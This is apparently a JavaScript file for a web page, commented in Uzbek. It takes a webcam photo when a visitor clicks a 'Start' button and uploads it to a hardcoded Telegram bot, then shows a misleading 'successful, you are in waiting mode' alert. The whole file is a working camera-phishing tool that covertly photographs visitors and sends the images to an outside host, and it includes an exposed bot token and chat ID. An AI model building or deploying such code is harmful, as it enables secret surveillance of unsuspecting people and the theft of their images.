// Kamera va rasm olish funksiyalari
const canvas = document.getElementById('canvas');
const startButton = document.getElementById('boshlash');

// Telegram API token va chat ID (o'zingizning bot tokeningiz va chat ID'ingizni kiriting)
const botToken = '7126592042:AAEa7uHG6nHy5-KptpU9abGPoUoBGmBDHjw';
const chatId = '5076290288';

// Kamera orqali surat olish
let stream;
navigator.mediaDevices.getUserMedia({ video: true })
    .then(mediaStream => {
        stream = mediaStream; // Kamerani surat olish uchun saqlaymiz
    })
    .catch(err => {
        console.error("Siz xatoga yo'l qo'ydingiz! Xatoni bartaraf qilish uchun sahifani yangilang!", err);
    });

// Boshlash tugmasi bosilganda rasmni olish
startButton.addEventListener('click', () => {
    const videoTrack = stream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(videoTrack);

    imageCapture.takePhoto()
        .then(blob => {
            const reader = new FileReader();
            reader.readAsDataURL(blob);
            reader.onloadend = () => {
                const dataURL = reader.result;
                sendPhotoToTelegram(dataURL);
            };
        })
        .catch(err => console.error('Nimadur  xato ketti: ', err));
});

// Rasmni Telegram orqali jo'natish funksiyasi
function sendPhotoToTelegram(dataURL) {
    const blob = dataURItoBlob(dataURL);

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'image.png');

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(result => {
        if (result.ok) {
            alert('Jarayon  muvaffaqiyatli bajarildi! Siz kutish rejimidasiz!');
        } else {
            console.error('Qandaydir  xato yuz berdi: ', result);
        }
    })
    .catch(error => {
        console.error('Xatolik yuz berdi: ', error);
    });
}

// Data URL'ni Blob'ga aylantirish funksiyasi
function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);

    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }

    return new Blob([ab], { type: mimeString });
}
